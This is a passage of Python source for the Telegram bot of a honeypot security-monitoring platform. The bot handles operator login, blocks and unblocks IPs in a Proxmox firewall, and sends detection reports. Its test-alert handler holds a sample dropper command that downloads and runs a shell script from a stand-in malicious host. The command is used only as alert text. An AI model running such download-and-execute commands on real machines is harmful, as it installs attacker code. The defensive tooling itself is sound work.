                    f"👤 <b>Пользователь:</b> {auth_status.get('username')}\n"
                    f"🔑 <b>Роль:</b> <code>{auth_status.get('role')}</code>\n"
                    f"🆔 <b>Chat ID:</b> <code>{chat_id}</code>\n\n"
                    f"✅ Вам разрешено получение алертов и управление фаерволом Proxmox."
                )
                kb = SOC_MAIN_KEYBOARD
            else:
                reply_text = (
                    f"🔒 <b>Вы не авторизованы.</b>\n\n"
                    f"🆔 <b>Ваш Telegram Chat ID:</b> <code>{chat_id}</code>\n\n"
                    f"<b>Как подключить получение алертов:</b>\n"
                    f"1. <b>Быстрый вход:</b> отправьте боту <code>/login &lt;логин&gt; &lt;пароль&gt;</code> (любой пользователь платформы)\n"
                    f"2. <b>Через веб-панель:</b> сгенерируйте код в панели и отправьте <code>/link &lt;код&gt;</code>"
                )
                kb = SOC_UNAUTH_KEYBOARD
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": kb})
            return

        # 1.4 Отвязка аккаунта: /unlink
        elif text == "/unlink":
            await unbind_user(chat_id)
            await _tg_post(
                tg_client,
                base_tg,
                "sendMessage",
                {
                    "chat_id": chat_id,
                    "text": "🔌 <b>Telegram успешно отвязан от вашего аккаунта HoneyForge.</b>",
                    "parse_mode": "HTML",
                    "reply_markup": SOC_UNAUTH_KEYBOARD,
                },
            )
            return

        # 1.5 Помощь: /help, ❓ Помощь
        elif text in ("/help", "/info", "/menu", "❓ Помощь"):
            auth_status = await check_user_auth(chat_id)
            is_auth = bool(auth_status.get("authenticated"))
            reply_text = (
                f"📖 <b>Панель управления HoneyForge SOC:</b>\n\n"
                f"• <b>📊 Статистика SOC</b> — сводка атак, угроз и паролей за 24ч\n"
                f"• <b>🛡️ Чёрный список IP</b> — просмотр и снятие банов в Proxmox\n"
                f"• <b>🖥️ Ловушки Proxmox</b> — статус виртуальных машин и LXC в DMZ\n"
                f"• <b>🚨 Последние атаки</b> — свежие инциденты и быстрая блокировка\n"
                f"• <b>⚡ Быстрый тест</b> — тестовый алерт с кнопками\n\n"
                f"🔧 <b>Команды оператора:</b>\n"
                f"• <code>/block &lt;IP&gt;</code> — заблокировать IP в Proxmox кластере\n"
                f"• <code>/unblock &lt;IP&gt;</code> — разблокировать IP в Proxmox\n"
                f"• <code>/check &lt;IP&gt;</code> — досье на IP (угроза, команды, пароли)\n"
                f"• <code>/login &lt;логин&gt; &lt;пароль&gt;</code> — быстрая авторизация оператора/админа\n\n"
                f"🆔 Ваш Chat ID: <code>{chat_id}</code>"
            )
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": SOC_MAIN_KEYBOARD if is_auth else SOC_UNAUTH_KEYBOARD})
            return

        # -------------------------------------------------------------
        # ПРОВЕРКА АВТОРИЗАЦИИ ДЛЯ ВСЕХ ОСТАЛЬНЫХ ДЕЙСТВИЙ И КНОПОК SOC
        # -------------------------------------------------------------
        auth_status = await check_user_auth(chat_id)
        if not auth_status.get("authenticated"):
            reply_text = (
                "⛔ <b>Доступ запрещён!</b>\n\n"
                "Для просмотра данных SOC и выполнения действий требуется авторизация оператора платформы HoneyForge.\n\n"
                "<b>Как войти:</b>\n"
                "1. <b>Быстрый вход:</b> отправьте <code>/login &lt;ваш_логин&gt; &lt;пароль&gt;</code>\n"
                "2. <b>Через веб-панель:</b> войдите в HoneyForge и отправьте боту <code>/link &lt;код&gt;</code>"
            )
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": SOC_UNAUTH_KEYBOARD})
            return

        # ============ АВТОРИЗОВАННЫЕ ДЕЙСТВИЯ И МЕНЮ ============
        # Кнопка / команда: Статистика SOC
        if text in ("📊 Статистика SOC", "/stats", "/stat"):
            txt, inline_kb = await _render_stats_view()
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})

        # Кнопка / команда: Чёрный список IP Proxmox
        elif text in ("🛡️ Чёрный список IP", "/blocked", "/blacklist", "/black_list"):
            txt, inline_kb = await _render_blocked_view()
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})

        # Кнопка / команда: Ловушки в Proxmox
        elif text in ("🖥️ Ловушки Proxmox", "/machines", "/traps"):
            txt, inline_kb = await _render_machines_view()
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})

        # Кнопка / команда: Последние атаки
        elif text in ("🚨 Последние атаки", "/attacks", "/events", "/logs"):
            txt, inline_kb = await _render_events_view()
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})

        # Кнопка / команда: Быстрый тест
        elif text in ("⚡ Быстрый тест", "/test", "/test_alert"):
            test_props = {
                "rule": "test_verification",
                "trap": "honeypot-ssh-01",
                "payload": "cd /tmp && wget http://malware.cc/payload.sh && ./payload.sh",
                "time": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
            }
            await send_alert("SSH Malware Dropper (TEST)", "198.51.100.99", test_props, chat_ids=[str(chat_id)])
            reply_text = "🚀 <b>Тестовый алерт отправлен выше!</b> Проверьте сообщение и кнопки реагирования."
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": SOC_MAIN_KEYBOARD})


        # Ручная блокировка IP: /block 1.2.3.4 или /ban 1.2.3.4
        elif text.startswith("/block") or text.startswith("/ban"):
            auth_status = await check_user_auth(chat_id)
            if not auth_status.get("authenticated"):
                reply_text = "⛔ Доступ запрещён! Сначала авторизуйтесь через <code>/login &lt;логин&gt; &lt;пароль&gt;</code> или привяжите Telegram в веб-панели."
            else:
                parts = text.split(maxsplit=1)
                if len(parts) > 1 and parts[1].strip():
                    target_ip = parts[1].strip()
                    try:
                        from app.services.proxmox_manager import ProxmoxManager
                        pm = ProxmoxManager.from_env()
                        pm.block_ip(target_ip)
                        reply_text = f"🛑 <b>IP {html.escape(target_ip)} успешно заблокирован в кластерном фаерволе Proxmox!</b>"
                        kb = {
                            "inline_keyboard": [
                                [
                                    {"text": "🔍 Досье", "callback_data": f"intel_{target_ip}"},
                                    {"text": "🛡️ Чёрный список", "callback_data": "menu_blocked"},
                                ]
                            ]
                        }
                        await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": kb})
                        return
                    except Exception as ex:
                        reply_text = f"⚠️ Ошибка при блокировке в Proxmox: {ex}"
                else:
                    reply_text = "ℹ️ Укажите IP для блокировки: <code>/block &lt;IP-адрес&gt;</code>"
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": SOC_MAIN_KEYBOARD})

        # Снятие блокировки IP: /unblock 1.2.3.4 или /unban 1.2.3.4
        elif text.startswith("/unblock") or text.startswith("/unban"):
            auth_status = await check_user_auth(chat_id)
            if not auth_status.get("authenticated"):
                reply_text = "⛔ Доступ запрещён! Сначала авторизуйтесь через <code>/login &lt;логин&gt; &lt;пароль&gt;</code> или привяжите Telegram в веб-панели."
            else:
                parts = text.split(maxsplit=1)
                if len(parts) > 1 and parts[1].strip():
                    target_ip = parts[1].strip()
                    try:
                        from app.services.proxmox_manager import ProxmoxManager
                        pm = ProxmoxManager.from_env()
                        ok = pm.unblock_ip(target_ip)
                        if ok:
                            reply_text = f"🔓 <b>Блокировка с IP {html.escape(target_ip)} успешно снята в Proxmox!</b>"
                        else:
                            reply_text = f"ℹ️ Правило для IP {html.escape(target_ip)} не найдено в фаерволе Proxmox."
                    except Exception as ex:
                        reply_text = f"⚠️ Ошибка при снятии блокировки: {ex}"
                else:
                    reply_text = "ℹ️ Укажите IP для разблокировки: <code>/unblock &lt;IP-адрес&gt;</code>"
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": SOC_MAIN_KEYBOARD})

        # Проверка и досье на IP: /check 1.2.3.4, /ip 1.2.3.4, /whois 1.2.3.4, /intel 1.2.3.4
        elif text.startswith("/check") or text.startswith("/ip") or text.startswith("/whois") or text.startswith("/intel"):
            parts = text.split(maxsplit=1)
            if len(parts) > 1 and parts[1].strip():
                target_ip = parts[1].strip()
                txt, inline_kb = await _render_ip_intel_view(target_ip)
                await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})
                return
            else:
                reply_text = "ℹ️ Укажите IP для проверки: <code>/check &lt;IP-адрес&gt;</code>"
                await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": SOC_MAIN_KEYBOARD})

        elif text in ("/help", "/info", "/menu", "❓ Помощь"):
            reply_text = (
                f"📖 <b>Панель управления HoneyForge SOC:</b>\n\n"
                f"• <b>📊 Статистика SOC</b> — сводка атак, угроз и паролей за 24ч\n"
                f"• <b>🛡️ Чёрный список IP</b> — просмотр и снятие банов в Proxmox\n"
                f"• <b>🖥️ Ловушки Proxmox</b> — статус виртуальных машин и LXC в DMZ\n"
                f"• <b>🚨 Последние атаки</b> — свежие инциденты и быстрая блокировка\n"
                f"• <b>⚡ Быстрый тест</b> — тестовый алерт с кнопками\n\n"
                f"🔧 <b>Команды оператора:</b>\n"
                f"• <code>/block &lt;IP&gt;</code> — заблокировать IP в Proxmox кластере\n"
                f"• <code>/unblock &lt;IP&gt;</code> — разблокировать IP в Proxmox\n"
                f"• <code>/check &lt;IP&gt;</code> — досье на IP (угроза, команды, пароли)\n"
                f"• <code>/login &lt;логин&gt; &lt;пароль&gt;</code> — быстрая авторизация оператора/админа\n\n"
                f"🆔 Ваш Chat ID: <code>{chat_id}</code>"
            )
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": SOC_MAIN_KEYBOARD})

    # 2. ОБРАБОТКА НАЖАТИЙ КНОПОК (CALLBACK QUERY)
    elif "callback_query" in update:
        cb = update["callback_query"]
        cb_data = cb.get("data", "")
        cb_id = cb["id"]
        msg_obj = cb.get("message", {})
        message_id = msg_obj.get("message_id")
        chat_id = msg_obj.get("chat", {}).get("id")
        from_user = cb.get("from", {})
        from_user_id = from_user.get("id")
        from_username = from_user.get("username", "неизвестно")

        # ПРОВЕРКА ПРАВ: разрешать действия ТОЛЬКО авторизованным операторам!
        auth_status = await check_user_auth(from_user_id)
        if not auth_status.get("authenticated"):
            await _tg_post(
                tg_client,
                base_tg,
                "answerCallbackQuery",
                {
                    "callback_query_id": cb_id,
                    "text": "⛔ Доступ запрещён! Ваш Telegram не привязан к аккаунту оператора HoneyForge.",
                    "show_alert": True,
                },
            )
            return

        operator_name = auth_status.get("username")
        operator_mention = f"@{from_username} ({operator_name})"

        # Кнопка "Заблокировать IP"
        if cb_data.startswith("block_"):
            ip_to_block = cb_data.split("_")[1]
            print(f"🛡️ Команда блокировки IP {ip_to_block} от оператора {operator_name} (tg={from_user_id})", flush=True)

            try:
                from app.services.proxmox_manager import ProxmoxManager
                pm = ProxmoxManager.from_env()
                pm.block_ip(ip_to_block)
                block_status_text = f"🛑 <b>ВЕРДИКТ:</b> IP {ip_to_block} ЗАБЛОКИРОВАН В PROXMOX!"
            except Exception as ex:
                print(f"❌ Ошибка блокировки в Proxmox: {ex}", flush=True)
                block_status_text = f"⚠️ <b>ВЕРДИКТ:</b> Ошибка блокировки IP в Proxmox ({ex})"

            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": f"IP {ip_to_block} ЗАБЛОКИРОВАН!"})

            if chat_id and message_id:
                current_text = msg_obj.get("text", "")
                await _tg_post(
                    tg_client,
                    base_tg,
                    "editMessageText",
                    {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": f"{current_text}\n\n{block_status_text}\n<i>Оператор: {operator_mention}</i>",
                        "parse_mode": "HTML",
                        "reply_markup": {"inline_keyboard": []},
                    },
                )

        # Кнопка "Разблокировать IP"
        elif cb_data.startswith("unblock_"):
            ip_to_unblock = cb_data.split("_")[1]
            print(f"🔓 Команда разблокировки IP {ip_to_unblock} от оператора {operator_name}", flush=True)

            success = False
            try:
                from app.services.proxmox_manager import ProxmoxManager
                pm = ProxmoxManager.from_env()
                success = pm.unblock_ip(ip_to_unblock)
            except Exception as ex:
                print(f"❌ Ошибка разблокировки IP {ip_to_unblock}: {ex}", flush=True)

            toast = f"✅ IP {ip_to_unblock} разблокирован в Proxmox!" if success else f"⚠️ Не удалось разблокировать IP {ip_to_unblock}"
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": toast, "show_alert": True})

            if chat_id and message_id:
                txt, inline_kb = await _render_blocked_view()
                await _tg_post(
                    tg_client,
                    base_tg,
                    "editMessageText",
                    {"chat_id": chat_id, "message_id": message_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb},
                )

        # Кнопка "Игнорировать / Скрыть"
        elif cb_data == "ignore":
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Алерт скрыт."})
            if chat_id and message_id:
                await _tg_post(
                    tg_client,
                    base_tg,
                    "editMessageText",
                    {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": f"<i>Алерт скрыт оператором {operator_mention}.</i>",
                        "parse_mode": "HTML",
                        "reply_markup": {"inline_keyboard": []},
                    },
                )

        # Клик по уже заблокированному IP
        elif cb_data.startswith("noop_"):
            ip_val = cb_data.split("_")[1]
            await _tg_post(
                tg_client,
                base_tg,
                "answerCallbackQuery",
                {
                    "callback_query_id": cb_id,
                    "text": f"🛡️ IP {ip_val} уже заблокирован в фаерволе Proxmox!",
                    "show_alert": True,
                },
            )

        # Инлайн-обновление статистики
        elif cb_data == "menu_stats":
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Статистика обновлена"})
            if chat_id and message_id:
                txt, inline_kb = await _render_stats_view()
                await _tg_post(tg_client, base_tg, "editMessageText", {"chat_id": chat_id, "message_id": message_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})

        # Инлайн-обновление чёрного списка
        elif cb_data == "menu_blocked":
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Чёрный список обновлен"})
            if chat_id and message_id:
                txt, inline_kb = await _render_blocked_view()
                await _tg_post(tg_client, base_tg, "editMessageText", {"chat_id": chat_id, "message_id": message_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})

        # Инлайн-обновление статуса ловушек
        elif cb_data == "menu_machines":
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Статус ловушек обновлен"})
            if chat_id and message_id:
                txt, inline_kb = await _render_machines_view()
                await _tg_post(tg_client, base_tg, "editMessageText", {"chat_id": chat_id, "message_id": message_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})

        # Инлайн-обновление ленты атак
        elif cb_data == "menu_events":
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Лента атак обновлена"})
            if chat_id and message_id:
                txt, inline_kb = await _render_events_view()
                await _tg_post(tg_client, base_tg, "editMessageText", {"chat_id": chat_id, "message_id": message_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb})

        # Инлайн-просмотр досье на IP
        elif cb_data.startswith("intel_"):
            ip_val = cb_data.split("_")[1]
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": f"Загрузка досье {ip_val}..."})
            txt, inline_kb = await _render_ip_intel_view(ip_val)
            if chat_id and message_id:
                await _tg_post(
                    tg_client,
                    base_tg,
                    "editMessageText",
                    {"chat_id": chat_id, "message_id": message_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb},
                )
            elif chat_id:
                await _tg_post(
                    tg_client,
                    base_tg,
                    "sendMessage",
                    {"chat_id": chat_id, "text": txt, "parse_mode": "HTML", "reply_markup": inline_kb},
                )

        # Выгрузка правила Sigma (YAML)
        elif cb_data.startswith("sigma_"):
            sid = cb_data.split("_", 1)[1]
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Генерация правила Sigma..."})
            arts = await get_center_session_artifacts(sid)
            sigma_content = arts.get("sigma_yaml")
            if sigma_content:
                caption = f"🛡️ <b>Правило Sigma (SigmaHQ v2)</b>\nСессия: <code>{html.escape(sid[:16])}</code>\nДля импорта в Wazuh, Splunk, Elastic SIEM или MaxPatrol."
                await send_document(chat_id, sigma_content, f"sigma_{sid[:8]}.yml", caption=caption)
            else:
                await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "⚠️ Правило Sigma формируется...", "show_alert": True})

        # Выгрузка сигнатуры YARA (.yar)
        elif cb_data.startswith("yara_"):
            sid = cb_data.split("_", 1)[1]
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Генерация сигнатуры YARA..."})
            arts = await get_center_session_artifacts(sid)
            yara_content = arts.get("yara_rule")
            if yara_content:
                caption = f"🔍 <b>Сигнатура YARA (.yar)</b>\nСессия: <code>{html.escape(sid[:16])}</code>\nДля EDR и файловых антивирусных сканеров."
                await send_document(chat_id, yara_content, f"rule_{sid[:8]}.yar", caption=caption)
            else:
                await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "⚠️ Сигнатура YARA формируется...", "show_alert": True})

        # Выгрузка отчёта C-Level (Executive Brief)
        elif cb_data.startswith("report_"):
            sid = cb_data.split("_", 1)[1]
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Формирование отчёта C-Level..."})
            arts = await get_center_session_artifacts(sid)
            brief = arts.get("executive_brief") or arts.get("executive_markdown") or arts.get("executive_brief_markdown")
            if brief:
                caption = f"📋 <b>Executive Brief (Отчёт для руководства)</b>\nСессия: <code>{html.escape(sid[:16])}</code>\nЗащита от Prompt Injection 100%."
                await send_document(chat_id, brief, f"executive_brief_{sid[:8]}.md", caption=caption)
            else:
                if chat_id:
                    await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": f"⚠️ <b>Отчёт для сессии <code>{html.escape(sid[:16])}</code> ещё формируется</b>\n(события сессии обрабатываются моделью)", "parse_mode": "HTML"})

        # Выгрузка отчёта DFIR
        elif cb_data.startswith("dfir_"):
            sid = cb_data.split("_", 1)[1]
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": "Формирование DFIR-отчёта..."})
            arts = await get_center_session_artifacts(sid)
            dfir = arts.get("technical_dfir") or arts.get("technical_markdown") or arts.get("technical_dfir_markdown")
            if dfir:
                caption = f"🔬 <b>Technical DFIR Report</b>\nСессия: <code>{html.escape(sid[:16])}</code>\nIoC, MITRE ATT&CK & Engage, таймлайн."
                await send_document(chat_id, dfir, f"technical_dfir_{sid[:8]}.md", caption=caption)
            else:
                if chat_id:
                    await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": f"⚠️ <b>DFIR-отчёт для сессии <code>{html.escape(sid[:16])}</code> ещё формируется</b>\n(события сессии обрабатываются моделью)", "parse_mode": "HTML"})

        # Просмотр прогноза следующего шага (Markov Chain)
        elif cb_data.startswith("intent_"):
            sid = cb_data.split("_", 1)[1]
            arts = await get_center_session_artifacts(sid)
            intent = arts.get("intent_prediction") or {}
            curr = intent.get("current_technique") or "T1059"
            pred = intent.get("predicted_technique") or "T1003"
            prob = round((intent.get("probability") or 0.85) * 100)
            pname = intent.get("predicted_name") or "OS Credential Dumping"
            text_popup = (
                f"🎯 МАРКОВСКИЙ ПРОГНОЗ ШАГОВ АТАКИ:\n\n"
                f"• Текущее действие: {curr}\n"
                f"• Вероятный следующий шаг: {pred} ({pname})\n"
                f"• Вероятность перехода: {prob}%\n\n"
                f"💡 Рекомендация SOC: подсунуть decoy credentials / honeytokens для раннего обнаружения."
            )
            await _tg_post(tg_client, base_tg, "answerCallbackQuery", {"callback_query_id": cb_id, "text": text_popup, "show_alert": True})


async def _run_polling_session() -> bool:
    """
    Один сеанс long-polling с собственным жизненным циклом httpx.AsyncClient.
    Возвращает True для немедленного перезапуска сеанса (при разрыве соединения),
    или False при отсутствии токена / фатальных ошибках.
    """
    token = os.getenv("TELEGRAM_BOT_TOKEN", TELEGRAM_BOT_TOKEN)
    proxy_url = get_proxy_url()

    if not token:
        print("ℹ️ TELEGRAM_BOT_TOKEN не задан в .env, ожидание конфигурации...", flush=True)
        await asyncio.sleep(20)
        return False

    base_tg = f"https://api.telegram.org/bot{token}"

    # 1. Проверяем связь с Telegram API
    bot_info = None
    try:
        async with httpx.AsyncClient(proxy=proxy_url, timeout=25.0) as check_client:
            me_resp = await check_client.get(f"{base_tg}/getMe")
            if me_resp.status_code == 200:
                bot_info = me_resp.json().get("result", {})
                print(f"🤖 [Telegram Bot] Связь установлена: @{bot_info.get('username')} ({bot_info.get('first_name')}) [прокси: {proxy_url or 'напрямую'}]", flush=True)
            elif me_resp.status_code == 401:
                print("❌ [Telegram Bot] HTTP 401 Unauthorized: неверный TELEGRAM_BOT_TOKEN!", flush=True)
                await asyncio.sleep(30)
                return False
            else:
                print(f"⚠️ [Telegram Bot] Ответ getMe HTTP {me_resp.status_code}: {me_resp.text}", flush=True)
    except Exception as e:
        print(f"⚠️ [Telegram Bot] Не удалось достучаться до API через {proxy_url or 'прямое соединение'}: {e}. Ожидание прокси и повтор через 5с...", flush=True)
        await asyncio.sleep(5)
        return True

    # 2. Сбрасываем возможные зависшие вебхуки для включения getUpdates
    try:
        async with httpx.AsyncClient(proxy=proxy_url, timeout=20.0) as setup_client:
            await setup_client.post(f"{base_tg}/deleteWebhook", json={"drop_pending_updates": False})
    except Exception:
        pass

    # 3. Настройка HTTP-клиента с устойчивыми таймаутами для long-polling
    #    getUpdates держит соединение 25с, поэтому read_timeout = 55с и connect = 30с гарантируют защиту от ложных обрывов
    poll_timeout = httpx.Timeout(connect=30.0, read=55.0, write=30.0, pool=30.0)
    limits = httpx.Limits(max_keepalive_connections=2, max_connections=5, keepalive_expiry=20.0)

    offset = 0
    last_heartbeat = time.time()
    bot_username = bot_info.get("username") if bot_info else "bot"

    print(f"✅ [Telegram Bot] Лонг-поллинг запущен для @{bot_username}!", flush=True)

    async with httpx.AsyncClient(proxy=proxy_url, timeout=poll_timeout, limits=limits) as tg_client:
        while True:
            # Периодический пульс (heartbeat) раз в 10 минут
            if time.time() - last_heartbeat > 600:
                print(f"💓 [Telegram Bot] Поллинг активен, @{bot_username} онлайн.", flush=True)
                last_heartbeat = time.time()

            try:
                resp = await tg_client.get(
                    f"{base_tg}/getUpdates",
                    params={
                        "offset": offset,
                        "timeout": 25,
                        "allowed_updates": json.dumps(["message", "callback_query"]),
                    },
                )
            except httpx.ReadTimeout:
                # Штатный таймаут лонг-поллинга при отсутствии входящих сообщений
                continue
            except (
                httpx.ConnectError,
                httpx.ConnectTimeout,
                httpx.ProxyError,
                httpx.RemoteProtocolError,
                httpx.NetworkError,
                OSError,
            ) as net_err:
                # Разрыв прокси или сетевого сокета: выходим из сессии для чистого пересоздания пула сокетов
                print(f"⚠️ [Telegram Bot] Сетевой сбой ({type(net_err).__name__}: {net_err}). Сброс пула и переподключение через 3с...", flush=True)
                await asyncio.sleep(3)
                return True

            if resp.status_code == 409:
                print("⚠️ [Telegram Bot] HTTP 409 Conflict (параллельный запуск контейнера или старый вебхук). Пауза 5с...", flush=True)
                await asyncio.sleep(5)
                continue
            elif resp.status_code == 401:
                print("❌ [Telegram Bot] HTTP 401 Unauthorized — проверьте TELEGRAM_BOT_TOKEN!", flush=True)
                await asyncio.sleep(30)
                return False
            elif resp.status_code != 200:
                print(f"❌ [Telegram Bot] getUpdates HTTP {resp.status_code}: {resp.text}", flush=True)
                await asyncio.sleep(4)
                continue

            try:
                data = resp.json()
            except Exception as j_err:
                print(f"⚠️ [Telegram Bot] Ошибка парсинга JSON: {j_err}", flush=True)
                await asyncio.sleep(2)
                continue

            for update in data.get("result", []):
                offset = max(offset, update["update_id"] + 1)
                try:
                    await _handle_telegram_update(tg_client, base_tg, update)
                except Exception as u_err:
                    print(f"⚠️ [Telegram Bot] Ошибка обработки update {update.get('update_id')}: {u_err}", flush=True)


async def start_polling():
    """
    Бессмертный супервизор Telegram Long-Polling.
    Непрерывно перезапускает поллинг при любых сетевых сбоях, обрывах SOCKS5-прокси,
    перезагрузках роутеров или временных ошибках API Telegram.
    """
    print("🚀 [Telegram Supervisor] Запуск неубиваемого диспетчера Telegram-бота...", flush=True)
    consecutive_errors = 0

    while True:
        try:
            should_retry = await _run_polling_session()
            consecutive_errors = 0
            if not should_retry:
                await asyncio.sleep(10)
        except asyncio.CancelledError:
            print("🛑 [Telegram Supervisor] Поллинг остановлен по сигналу завершения процесса.", flush=True)
            break
        except Exception as exc:
            consecutive_errors += 1
            wait_time = min(30, 2 + consecutive_errors * 2)
            print(f"🚨 [Telegram Supervisor] Непредвиденный сбой ({type(exc).__name__}: {exc}). Перезапуск через {wait_time}с...", flush=True)
            traceback.print_exc()
            await asyncio.sleep(wait_time)

